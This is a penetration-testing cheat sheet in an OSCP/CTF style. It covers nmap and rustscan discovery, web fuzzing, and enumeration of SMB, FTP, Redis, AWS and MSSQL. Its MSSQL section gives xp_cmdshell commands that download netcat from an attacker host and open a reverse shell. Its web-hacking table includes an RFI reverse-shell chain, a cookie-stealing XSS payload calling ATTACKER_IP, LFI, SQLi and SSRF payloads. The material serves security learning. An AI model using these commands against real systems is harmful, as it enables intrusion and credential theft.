---
date: "2025-08-29"
layout: "single"
hidemeta: true
---
# 🎯 Overview

## 📋 Methodology Phases

Standard penetration testing methodology:

1. **🔍 Host Discovery** - Identify live hosts and network topology
2. **🔎 Service Scanning** - Enumerate open ports and running services  
3. **⚡ Gain Access/Exploit** - Exploit vulnerabilities to gain initial access
4. **🛠️ Post-Exploitation** - Maintain access and escalate privileges
   - **📊 Survey** - Gather information about the compromised system
   - **⬆️ PrivEsc** - Escalate privileges to higher-level accounts
1. **🔄 Pivot** - Use compromised systems to access additional networks

### Additional

- https://brandonrussell.io/OSCP-Notes/

## 📚 Reference Frameworks

- [Unified Kill Chain](https://www.unifiedkillchain.com/) - Comprehensive attack framework
- [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) - Original kill chain methodology
- [https://www.varonis.com/blog/cyber-kill-chain](Varonis Kill Chain) - similar model
- [Active Directory Attack-Defense](https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md)

## 🔍 Searching

- **Shodan.io**: https://www.shodan.io/dashboard?language=en
  - https://www.shodan.io/search/examples
- **Censys**: https://docs.censys.com/docs/ls-introductory-use-cases#/
- **Advanced Search Operators**: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#socialmedia

# 🔍 Host Discovery

Host discovery is the first phase of network reconnaissance, focused on identifying live hosts within a target network.

## 🚀 RustScan

RustScan **(`-sT` or TCP full-connect only!)** finds targets and open ports quickly and feeds that into `nmap` for stronger scanning. A host discovery command that would take `nmap` minutes will only take `rustscan` seconds.

```bash
# Just top 100
sudo rustscan --scan-order "Random" -a <TARGET> -- -oA $(date +%Y-%m-%d_%H%M)_rustscan --top-ports 100

# Noisy but quick; -A = -sC -sV -O --traceroute
sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a <TARGET> -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
```

## 🗺️ NMAP: `-P*`

`Nmap` is the industry-standard network discovery and security auditing tool.

**References:**
- [Nmap Manual](https://linux.die.net/man/1/nmap)
- [Subnet Calculator](https://subnetcalculator.net/)

### ⚙️ Helpful Options

- `-sn` (skip port scan) is a technique to quickly find live hosts. It avoids port scanning, which saves time and reduces network traffic.
- `--reason` explains why a particular result is determined
- `-vvv` increases verbosity
- `-dd` debug mode
- `-A` equivalent to `-sV -O -sC --traceroute`

#### 💾 Saving Results

Filtering out live hosts for `-iL`:

```bash
# Find and save live hosts
sudo nmap -sn -oA $(date +%Y-%m-%d_%H%M)_host_disc

# Strip out live hosts
grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt

# Use that list
sudo nmap -sn -iL live_hosts.txt -oA $(date +%Y-%m-%d_%H%M)_host_disc_live <TARGET>
```
#### 🌐 DNS Lookups

- `-n`: Do **NOT** try to reverse-DNS lookup hosts
- `-R`: Do try to reverse-DNS lookup hosts, even offline ones
  - Use `--dns-servers` to specify the DNS server

### 🎯 Default Probes

These are run in parallel:

|                | **Local**    | **Remote**                                                                                               |
| :------------- | :----------- | :------------------------------------------------------------------------------------------------------- |
| **Normal**     | ARP requests | - TCP connect 3-way handshake: <br>  - SYN to port 80 <br>  - SYN to port 443                            |
| **Privileged** | ARP requests | - ICMP 8 echo request <br>- ICMP 13 timestamp request <br>- TCP ACK to port 80 <br>- TCP SYN to port 443 |

### 🔗 ARP: -PR

- Works on local networks only (checked via routing table and network interfaces with subnet match)
- Very reliable
- Force ARP `-PR` vs. force IP-only `--send-ip`
  - e.g., `sudo nmap -PR -sn <TARGET>` will do only ARP pings on the local network 

### 📡 ICMP: -PE/-PP/-PM

| Flag  | Scan Type                        | Description                                                                                                                                                                         |
| :---- | :------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-PE` | ICMP Echo Request (type 8)       | Sends a standard ICMP Echo Request packet (ping). If a host is up, it will respond with an ICMP Echo Reply (type 0).                                                                |
| `-PP` | ICMP Timestamp Request (type 13) | Sends a timestamp request packet to the target. An up host will respond with a timestamp reply (type 14). This is often used to bypass firewalls that block standard echo requests. |
| `-PM` | ICMP Netmask Request (17)        | Sends a netmask request packet to the target. A host that is up and responds will send back a netmask reply (type 18). This is another technique to evade simple filters.           |

#### 🛡️ Windows Firewall Behavior

Usually for this firewall rule "File and Printer Sharing (Echo Request - ICMPv4-In)"

| Network Profile | ICMP Echo (Type 8)                                         | ICMP Timestamp (Type 13)                                   |
| :-------------- | :--------------------------------------------------------- | :--------------------------------------------------------- |
| **Public**      | **Blocked.** (Default behavior to prevent reconnaissance.) | **Blocked.** (Default behavior to prevent reconnaissance.) |
| **Private**     | **Allowed.** (Default rule enabled for troubleshooting.)   | **Blocked.** (No default rule to allow this traffic.)      |
| **Domain**      | **Allowed.** (Default rule enabled for troubleshooting.)   | **Blocked.** (No default rule to allow this traffic.)      |

### 🔌 TCP SYN/ACK: -PS/-PA

Specify ports by giving a number after the TCP scan type like `-PS<port(s)>`

# 🔎 Service Scanning

Service scanning involves identifying open ports and determining what services are running on target hosts.

## 🗺️ NMAP: `-s*`

Nmap's service scanning options (`-s*`) provide various techniques for port scanning and service detection.

| Category                 | Option                       | Description                                                                                                                                   |
| :----------------------- | :--------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------- |
| **Port Specification**   | `-p<portlist>`               | Scans specific ports or ranges. `p22,80,443` (list), `p1-1023` (range), `p-` (all ports)                                                      |
|                          | `-F`                         | **Fast mode:** Scans the top 100 most common ports.                                                                                           |
|                          | `--top-ports <NUMBER>`       | Scans the specified number of most common ports.                                                                                              |
| **Timing & Performance** | `-T<0-5>`                    | Sets a timing template. `0` is slowest (paranoid) for IDS, `3` is default (normal), `4` is recommended for CTFs, and `5` is fastest (insane). |
|                          | `--min-rate <NUMBER>`        | Sets the min packets **per second**                                                                                                           |
|                          | `--max-rate <NUMBER>`        | Sets the max packets **per second**                                                                                                           |
| **Probing Parallelism**  | `--min-parallelism <NUMBER>` | Sets the min number of probes to run in parallel                                                                                              |
|                          | `--max-parallelism <NUMBER>` | Sets the max number of probes to run in parallel                                                                                              |

The `-Pn` skips the host discovery phase and assumes the machine is up.

By default, `nmap` scans the top 1,000 ports. `-F` scans top 100 instead (equivalent to `--top-ports 100`).

| State             | Description                                                                            |
| :---------------- | :------------------------------------------------------------------------------------- |
| `Open`            | A service is listening on the port                                                     |
| `Closed`          | No service is listening, but the port is accessible                                    |
| `Filtered`        | A firewall is blocking Nmap from reaching the port                                     |
| `Unfiltered`      | Nmap can't determine the state, but the port is accessible (seen with `-sA` ACK scans) |
| `Open/Filtered`   | Nmap can't tell if the port is open or blocked by a firewall                           |
| `Closed/Filtered` | Nmap can't tell if the port is closed or blocked by a firewall                         |

### 🔌 TCP: `-sT`/`-sS`

- open: SYN/ACK received
- filtered: nothing or FAKE RST received
- closed: RST received

#### 🔍 ACK: `-sA` (FW rule scan)

TCP scan with ACK. This scan is useful to **map out firewall rules**.

| State          | Description                                                                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Unfiltered** | `RST` packet received. The port is **accessible**, indicating it's not blocked by a firewall. But *Nmap cannot tell if the port is open or closed* |
| **Filtered**   | The port is **not accessible**, meaning a firewall or other security device is blocking the ACK probe. This indicates that the port is filtered.   |

#### **Malformed "Stealth" Scans (-sN, -sF, -sX)**

These scans are used to bypass simple, stateless firewalls or an IDS that is only configured to detect standard SYN packets. They work by sending non-standard TCP packets. RFC-compliant systems (like Linux) will only send a response (a TCP RST packet) if the port is **closed**. If the port is open, they send no response at all.

**Critical Note:** These scans are ineffective against modern Windows systems, which do not follow the RFC and send a RST packet regardless of whether the port is open or closed.

**Scan Definitions & Use Case**

| Option | Scan Name | Description / Flags Set | Primary Use Case & Key Limitation |
| :--- | :--- | :--- | :--- |
| `-sN` | **NULL Scan** | No flags are set. | **Firewall Evasion:** Slips past firewalls that only check for SYN packets. **Limitation:** Does NOT work on Windows. |
| `-sF` | **FIN Scan** | Only the FIN flag is set. | **Firewall Evasion:** Same purpose as the NULL scan, just a different probe. **Limitation:** Does NOT work on Windows. |
| `-sX` | **Xmas Scan** | The FIN, PSH, and URG flags are set. | **Firewall Evasion:** Same purpose, but "louder" and more likely to be logged. **Limitation:** Does NOT work on Windows. |

**How Nmap Interprets the Results**

| Nmap State      | Network Response Received      | Likely Meaning for RFC-Compliant Targets (e.g., Linux)               |
| :-------------- | :----------------------------- | :------------------------------------------------------------------- |
| `open/filtered` | **No response.**               | The port is **open**, or a stateful firewall is dropping the packet. |
| `closed`        | A **TCP RST** packet.          | The port is **closed**.                                              |
| `filtered`      | An **ICMP Unreachable** error. | A router or firewall is actively rejecting the packet.               |

### 🥷 Network Evasion Techniques

**IP and MAC Address Spoofing:**
- `-S` - Spoof source IP address
- `--spoof-mac` - Spoof MAC address
- `-e` - Specify network interface
- **Purpose**: Hides the scanner's true identity to evade internal security and logging

**Decoy Scanning:**
- `-D X.X.X.X,RND,ME,RND` - Makes a scan appear to come from multiple IP addresses
- **Purpose**: Makes it harder to pinpoint the attacker

**Packet Fragmentation:**
- `-f` - Fragment packets
- `--mtu` - Specify MTU size
- **Purpose**: Evades detection by older security devices

**Appending Data:**
- `--data-length` - Add bytes to packets
- **Purpose**: Makes packets appear like legitimate traffic

### 📡 UDP: `-sU`

UDP scanning is slower and less reliable than TCP scanning due to the connectionless nature of UDP.

```bash
sudo nmap -sU --top-ports 20 -v -oA $(date +%Y-%m-%d_%H%M)_udp_scan <TARGET>  # UDP is slow and unreliable
```

|State|Description|
|---|---|
|`Open`| Response from the service (requires proper service request) |
|`Closed`| No response received |
|`Filtered`| ICMP "Port Unreachable" received|

### 📜 Nmap Scripting Engine (NSE)

The Nmap Scripting Engine (NSE) extends Nmap's functionality with custom scripts for vulnerability detection, service enumeration, and exploitation.

**Reference:** [NSE Usage Guide](https://nmap.org/book/nse-usage.html)

#### 📖 How to Use NSE

**Basic Usage:**
- `-sC` - Run a set of popular, common scripts
- `--script` - Run specific scripts by name, category, or file path
- `--script-help` - Show arguments for `--script-args`

**Advanced Usage:**
- Combine scripts with wildcards: `--script "smb-*,http-*"`
- Use comprehensive documentation: [NSE Script Database](https://nmap.org/nsedoc/scripts/)
- Search for scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`

```bash
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' -oA $(date +%Y-%m-%d_%H%M)_http_put <TARGET>
```

##### 📂 Script Categories

Location: `/usr/share/nmap/scripts`

| Category | Description |
| :--- | :--- |
| **auth** | Scripts related to authentication, such as bypassing credentials or checking for default ones. |
| **broadcast** | Used to discover hosts on the local network by broadcasting requests. |
| **brute** | Scripts that perform brute-force attacks to guess passwords or credentials. |
| **default** | The core set of scripts that are run automatically with `-sC` or `-A`. |
| **discovery** | Actively gathers more information about a network, often using public registries or protocols like SNMP. |
| **dos** | Tests for vulnerabilities that could lead to a denial-of-service attack. |
| **exploit** | Actively attempts to exploit known vulnerabilities on a target system. |
| **external** | Interacts with external services or databases. |
| **fuzzer** | Sends unexpected or randomized data to a service to find bugs or vulnerabilities. |
| **intrusive** | These scripts can be noisy, resource-intensive, or potentially crash the target system. |
| **malware** | Scans for known malware or backdoors on a target host. |
| **safe** | Scripts that are considered safe to run as they are not designed to crash services, use excessive resources, or exploit vulnerabilities. |
| **version** | Extends the functionality of Nmap's version detection feature. |
| **vuln** | Checks a target for specific, known vulnerabilities. |

#### 📥 Install New Script

```bash
sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
    https://svn.nmap.org/nmap/scripts/<SCRIPT>.nse

nmap --script-updatedb
```

### 💡 Example Scans

```bash
# Check for anonymous FTP login
sudo nmap -Pn --script ftp-anon -oA $(date +%Y-%m-%d_%H%M)_ftp_anon <TARGET>

# Scan SMB ports for information and vulnerabilities
sudo nmap -n -Pn -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users -oA $(date +%Y-%m-%d_%H%M)_smb_enum <TARGET>

# Advanced Scans
sudo nmap -sS -p53 <NETBLOCK> -oA $(date +%Y-%m-%d_%H%M)_dns_tcp
sudo nmap -sU -p53 -oA $(date +%Y-%m-%d_%H%M)_dns_udp <NETBLOCK>
sudo nmap -n -Pn -sS -sV \
  --max-retries 1 \
  --host-timeout 45s \
  --initial-rtt-timeout 300ms \
  --max-rtt-timeout 1000ms \
  -p 21,22,23,25,53,80,110,135,139,443,445,3389 \
  -oA $(date +%Y-%m-%d_%H%M)_comprehensive_scan
  <TARGET>

# whois
nmap -n -Pn -sn --script whois-domain oA $(date +%Y-%m-%d_%H%M)_whois <TARGET_DOMAIN>

# Attempts to list available SMB shares on the target
nmap -p 445 --script smb-enum-shares -oA $(date +%Y-%m-%d_%H%M)_smb_shares <TARGET>
```

#### 🔍 Additional Service Scans
```bash
# DNS service discovery
sudo nmap -sU -Pn -n -p 53 --script=dns-recursion,dns-service-discovery -oA $(date +%Y-%m-%d_%H%M)_dns_scripts <TARGET>

# NTP information gathering
sudo nmap -sU -Pn -n -p 123 --script=ntp-info -oA $(date +%Y-%m-%d_%H%M)_ntp_info <TARGET>

# SNMP enumeration
sudo nmap -sU -Pn -n -p 161 --script=snmp-info <TARGET> -oA $(date +%Y-%m-%d_%H%M)_snmp_info
sudo nmap -sU -Pn -n -p 161 --script=snmp-brute -oA $(date +%Y-%m-%d_%H%M)_snmp_brute <TARGET>

# NetBIOS name service
sudo nmap -sU -Pn -n -p 137 --script=nbstat -oA $(date +%Y-%m-%d_%H%M)_nbstat <TARGET>

# DHCP discovery
sudo nmap -sU -Pn -n -p 67 --script=dhcp-discover -oA $(date +%Y-%m-%d_%H%M)_dhcp_discover <TARGET>

# TFTP enumeration
sudo nmap -sU -Pn -n -p 69 --script=tftp-enum -oA $(date +%Y-%m-%d_%H%M)_tftp_enum <TARGET>

# SSDP discovery
sudo nmap -sU -Pn -n -p 1900 --script=ssdp-discover -oA $(date +%Y-%m-%d_%H%M)_ssdp_discover <TARGET>

# IKE version detection
sudo nmap -sU -Pn -n -p 500 --script=ike-version -oA $(date +%Y-%m-%d_%H%M)_ike_version <TARGET>
```

### 🔍 `ffuf` Fuzzing

```bash
# --- 1. DIRECTORY & FILE DISCOVERY ---

# Basic Directory Fuzzing
ffuf -s -c -o ffuf_dirs -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:DIR -u http://$TARGET/DIR

# Basic File Fuzzing
ffuf -s -c -o ffuf_files -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:FILE -u http://$TARGET/FILE

# File Fuzzing with Specific Extensions
ffuf -s -c -o ffuf_files_ext -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:FILE -e .php,.txt,.html -u http://$TARGET/FILE

# --- 2. ADVANCED FILTERING ---

# Filter responses BY HTTP STATUS CODE
ffuf -s -c -o ffuf_filter_code -w FUZZ -u http://$TARGET/FUZZ -mc 200,301,302 -fc 403
# careful 403 could indicate files that we cant access atm

# Filter responses BY RESPONSE SIZE
ffuf -s -c -o ffuf_filter_size -w FUZZ -u http://$TARGET/FUZZ -fs 0

# Filter responses BY REGEX
# This example finds any file/dir starting with a dot (e.g., .git, .env)
ffuf -s -c -o ffuf_filter_regex -w FUZZ -u http://$TARGET/FUZZ -mr '/\..*'

# --- 3. PARAMETER & VALUE DISCOVERY ---

# Discover GET Parameter Names
ffuf -s -c -o ffuf_get_params -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u 'http://$TARGET/index.php?PARAM' -fw 39

# Fuzz GET Parameter Values
# This example fuzzes the 'id' parameter with numbers from 0 to 255
for i in {0..255}; do echo $i; done | ffuf -s -c -o ffuf_param_values -w -:PARAM_VAL -u 'http://$TARGET/index.php?id=PARAM_VAL' -fw 33

# Fuzz POST Data / Logins (ONLINE - use small wordlist to avoid lockouts)
ffuf -s -c -o ffuf_post_logins -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:PASSWORD -u http://$TARGET/login.php -X POST -d 'user=<USERNAME>&pass=PASSWORD' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1435

# --- 4. SUBDOMAIN & VHOST DISCOVERY ---

# Subdomain Fuzzing
ffuf -s -c -o ffuf_subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:SUBDOMAIN -u http://SUBDOMAIN.<DOMAIN>

# Virtual Host (VHost) Fuzzing
ffuf -s -c -o ffuf_vhosts -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:VHOST -u http://$TARGET -H 'Host: VHOST.<DOMAIN>'
```

## 🌐 DNS

- DNSDumpster: https://dnsdumpster.com/

```bash
whois <TARGET> > whois_$(date +%Y-%m-%d_%H%M).txt

dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns_$(date +%Y-%m-%d_%H%M).txt
# --- Record Types ---
# ANY: return all records -- sometimes doesnt work!
# A: IPv4 address
# AAAA: IPv6 address
# CNAME: Canonical Name
# MX: Mail Servers
# NS: Name Servers
# PTR: Pointer Record
# SOA: Start of Authority
# TXT: Text Records
# SRV: Service Records
# CAA: Certification Authority Authorization
for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> >> dns_all_records_$(date +%Y-%m-%d_%H%M).txt ; done

# IP -> DNS
dig -x <IP_ADDR> > dns_reverse_$(date +%Y-%m-%d_%H%M).txt

# RARE: DNS Zone Transfer
dig axfr @<DNS_SERVER> <TARGET> > dns_zone_transfer_$(date +%Y-%m-%d_%H%M).txt

# RARE: older DNS query
dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET> > dns_legacy_$(date +%Y-%m-%d_%H%M).txt
# EDNS breaks on Win, norecurse usu for internal networks
```

## 📁 FTP

```bash
# Connect to FTP server in passive mode with anonymous login
ftp -p -a <HOST>
# Username: anonymous
# Password: (no password required)

# List files and directories
ls

# Download files
get <FILENAME>

# Execute local commands (outside of FTP session)
!<COMMAND>
```

## 🏢 SMB / LDAP / Kerberos

```bash
# Perform a full enumeration of a target using enum4linux
enum4linux -a <TARGET> > enum4linux_$(date +%Y-%m-%d_%H%M).txt

# List available SMB shares without password
smbclient -N --list <HOSTNAME> > smb_shares_$(date +%Y-%m-%d_%H%M).txt

# Connect to an SMB share with a null session (no password)
smbclient -N //<TARGET>/<SHARE>

# Connect to SMB share with password
smbclient --password=<PASSWORD> '\\<HOSTNAME>\<SHARE>'

# SMB commands once connected:
ls                    # List files
get <FILE>           # Download file
recurse              # Toggle directory recursion

# SMB enumeration:
sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" -oA $(date +%Y-%m-%d_%H%M)_smb_domains <TARGET>

# LDAP-based enumeration
# Useful when SMB queries are blocked or hardened.
sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.search.filter="(objectClass=*)",ldap.search.attributes="namingContexts"' -oA $(date +%Y-%m-%d_%H%M)_ldap_search <TARGET>

# DNS / Start of Authority
dig @<TARGET> SOA > dns_soa_$(date +%Y-%m-%d_%H%M).txt
```

### 📂 SMB Administrative Shares

- **ADMIN$** - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.
- **C$** - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
- **IPC$** - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system

#### SMB Share Interaction
```bash
# List shares anonymously
smbclient -N -L //<TARGET_IP> > smb_list_$(date +%Y-%m-%d_%H%M).txt

# Connect to a public share anonymously
smbclient -N //<TARGET_IP>/Public

# Once connected:
# ls -> list files
# get <filename> -> download a file
```

## 🗄️ Redis

```bash
# Connect to Redis server
redis-cli -h <TARGET>

# Redis commands:
INFO                    # Get server information
CONFIG GET databases    # Get database configuration
INFO keyspace          # Get keyspace information
SELECT <DB_INDEX>       # Select database by index
KEYS *                  # List all keys
GET flag               # Get value for 'flag' key
```

## ☁️ AWS

```bash
# Install AWS CLI
sudo apt install -y awscli

# Configure AWS CLI (must provide values even if not used)
aws configure

# List S3 buckets using custom endpoint
aws --endpoint=<S3_URL> s3 ls

# List contents of specific S3 bucket
aws --endpoint=<S3_URL> s3 ls s3://<DOMAIN>

# Upload file to S3 bucket
aws --endpoint=<S3_URL> s3 cp <FILE> s3://<DOMAIN>
```

## 🖥️ MSSQL

```bash
# Connect to MSSQL server using impacket
/usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

# MSSQL commands:
select @@version;                    # Get SQL Server version

# Enable xp_cmdshell for command execution
enable_xp_cmdshell

# Execute commands via xp_cmdshell
xp_cmdshell "powershell.exe -exec bypass -c wget http://10.10.14.190:8000/nc64.exe -outfile ../../Users/<USER>/Desktop/nc64.exe"

# Set up listener for reverse shell
nc -lvnp 443

# Execute reverse shell
xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe -e cmd.exe <CALLBACK_IP> 443"

# Download and run winPEAS for privilege escalation
cd ~/Downloads/ && python3 -m http.server 8000 &
xp_cmdshell "powershell.exe -exec bypass -c wget http://<CALLBACK_IP>:8000/winPEASx64.exe -outfile ../../Users/<USER>/Desktop/winPEASx64.exe"
xp_cmdshell "powershell.exe -exec bypass ../../Users/<USER>/Desktop/winPEASx64.exe > ../../Users/<USER>/Desktop/winPEASx64.txt"

# Transfer results back
nc -nvlp 444 > winPEASx64.txt
xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe <CALLBACK_IP> 444 < ../../Users/<USER>/Desktop/winPEASx64.txt"
```

## 🌍 Web

### 🦊 Browser-based Reconn (Firefox)

- Proxy: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- User-Agent: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
- Techs used by website: https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
- Developer Tools: F12

- JavaScript Obfuscator: https://codebeautify.org/javascript-obfuscator
- JavaScript Deobfuscator: https://obf-io.deobfuscate.io/

### 🔍 Web Technology Detection

```bash
# Enumerates web server + version + OS + frameworks + JS libraries
whatweb --aggression 3 http://<TARGET> --log-brief=whatweb_scan.txt

# Command-line web vulnerability scanner
wapiti -f txt -o wapiti_scan --url http://<TARGET>

nikto -o nikto_scan.txt -h http://<TARGET>
```

### 🔍 Webserver Dirs

```bash
# Directory brute-force with a common wordlist
gobuster --quiet --threads 64 --output gobuster_dir_common dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://<TARGET>

# Directory brute-force using a larger wordlist
gobuster --quiet --threads 64 --output gobuster_dir_medium dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --url http://<TARGET>

# Same with file extensions
gobuster --quiet --threads 64 --output gobuster_dir_medium dir ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --extensions php,html,txt,bak,zip --url http://<TARGET>

### FEROXBUSTER: faster and recursive

feroxbuster -t 64 -o feroxbuster_dir_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<TARGET>:3333
```

### 🌐 Subdomains

```bash
gobuster --quiet --threads 64 --output gobuster_dns_top5000 dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -d <DOMAIN>
```

### 🌐 Virtual Hosts

```bash
gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 --domain <DOMAIN> -u "http://<TARGET>"  # uses IP addr
```

#### 🔍 Wpscan

```bash
# Enumerate Wordpress users
wpscan --enumerate u --output wpscan_users.txt --url http://<TARGET>/

# Brute-force creds
wpscan --password-attack wp-login --output wpscan_bruteforce.txt --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --url http://<TARGET>/
```

#### 🌐 cURL
```bash
# Fetch only the HTTP headers of a webpage
curl -I <TARGET> > http_headers_$(date +%Y-%m-%d_%H%M).txt

# Attempt to upload a file to a web server
curl --upload-file <FILE> <TARGET>/<FILENAME>

curl -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "PARAM1=VALUE&PARAM2=VALUE" \
     http://<TARGET>
```

#### 🔤 URL Encode/Decode String

```bash
# Encode
echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))'
# Decode
echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))'
```

### Web Hacking

| Vulnerability Type                 | Identification / Enumeration                                                                                                                                                                                                       | Exploitation / Commands                                                                                                                                                                                                                                      |
| :--------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **1. Recon & Content Discovery**   |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
| Initial Reconnaissance             | Check `robots.txt` & `sitemap.xml`. Inspect HTTP headers for server info and flags. Use a browser plugin or online tool (Wappalyzer) to identify the web stack (framework, CMS, etc.).                                             | `curl -v http://<TARGET>/robots.txt` <br> `curl -I http://<TARGET>`                                                                                                                                                                                          |
| Directory / File Fuzzing           | Use a wordlist to discover hidden files and directories. Look for revealing names like `dev.log`, `admin`, `private`, `backup.zip`.                                                                                                | `gobuster dir -u http://<TARGET>/ -w <WORDLIST>` <br> `ffuf -w <WORDLIST>:FUZZ -u http://<TARGET>/FUZZ`                                                                                                                                                      |
| Subdomain / VHost Fuzzing          | Check Certificate Transparency logs. Use Google Dorks. Fuzz for subdomains by altering the URL, and for Virtual Hosts (VHosts) by altering the `Host` header.                                                                      | `https://crt.sh/?q=%.<DOMAIN>` <br> `site:*.domain.com -site:www.domain.com` <br> `ffuf -w <WORDLIST>:FUZZ -u http://FUZZ.<DOMAIN>` <br> `ffuf -w <WORDLIST>:FUZZ -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>'`                                               |
| **2. Authentication & Fuzzing**    |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
| Username Enumeration               | On a sign-up or login form, fuzz the username field and look for a specific error message that indicates a user already exists (e.g., "username already exists").                                                                  | `ffuf -w <USER_LIST>:FUZZ -X POST -d "username=FUZZ&..." -H "Content-Type: ..." -u <URL> -mr "username already exists"`                                                                                                                                      |
| Password Brute-Force               | On a login form, use a list of known usernames and common passwords to attempt to log in. Filter out failed login attempts (e.g., by response code or size).                                                                       | `ffuf -w <USER_LIST>:W1,<PASS_LIST>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: ..." -u <LOGIN_URL> -fc <HTTP_CODE_FOR_FAIL>`                                                                                                                  |
| Cookie Tampering                   | Inspect cookies in Burp or browser dev tools. Look for human-readable values like `admin=false`, `userID=123`, or `logged_in=no`.                                                                                                  | Modify the cookie values and resend the request. <br> `curl -H "Cookie: logged_in=true; admin=true" http://<TARGET>/admin`                                                                                                                                   |
| **3. Server-Side Attacks**         |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
| Local File Inclusion (LFI)         | Look for parameters that include local files (e.g., `?page=about.php`, `?file=user.txt`). Test with directory traversal payloads.                                                                                                  | `curl http://<TARGET>/page.php?file=../../../../etc/passwd` <br> `curl -o- <URL>/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts` <br> (Old PHP) Use a null byte to bypass extension appending: `.../etc/passwd%00`                                                                                                                |
| Remote File Inclusion (RFI)        | Identify a parameter that accepts a URL. The server will fetch and execute/render the content from that URL.                                                                                                                       | **1. Host Payload:** `cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php` (edit IP/port). <br> **2. Serve Payload:** `python3 -m http.server 80` <br> **3. Trigger Exploit:** `curl http://<TARGET>/page.php?file=http://<ATTACKER_IP>/shell.php` |
| Server-Side Request Forgery (SSRF) | Look for parameters that fetch data from another URL (e.g., `?image_url=`, `?server=`).                                                                                                                                            | Manipulate the URL to make the server request internal resources. <br> `http://<TARGET>/item?server=127.0.0.1/admin` <br> `.../item?server=metadata.internal/latest/credentials`                                                                             |
| **4. Client-Side Attacks (XSS)**   |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
| Cross-Site Scripting (XSS)         | Test every input field with basic payloads. Use a polyglot for complex filtering. The goal is often to steal admin cookies.                                                                                                        | **Simple Test:** `<script>alert(1)</script>` <br> **Cookie Stealing Payload:** `<script>fetch('http://<ATTACKER_IP>:<PORT>/?c=' + btoa(document.cookie));</script>`                                                                                          |
| **5. SQL Injection (SQLi)**        |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
| SQLi Identification                | Append a single quote (`'`) to parameters and look for a database error or a change in the page content. For blind SQLi, inject a time-delay function.                                                                             | `http://<URL>?id=1'` <br> `...id=1' AND SLEEP(5)-- -`                                                                                                                                                                                                        |
| Union-Based SQLi                   | **1. Find Column Count:** `...id=1' ORDER BY 1-- -`, `...ORDER BY 2-- -`, etc. <br> **2. Extract Data:** `...id=0' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -` |                                                                                                                                                                                                                                                              |
| **6. Other Vulnerabilities**       |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
